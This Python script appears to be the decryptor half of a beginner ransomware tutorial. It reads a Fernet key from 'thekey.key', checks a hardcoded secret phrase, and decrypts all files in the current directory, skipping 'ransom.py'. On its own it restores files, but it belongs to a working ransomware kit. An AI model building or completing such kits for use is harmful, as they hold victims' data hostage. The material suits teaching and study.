#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# This is an empty list variable called "files" it is empty because we haven't read any files yet, we will add them later

files = []

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read() 

secretphrase = "password"

user_phrase = input("Enter the secret phrase to decrypt your files: ")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Your files are now decrypted.")

# Error for wrong phrase
else:
    print("Sorry, wrong phrase.")
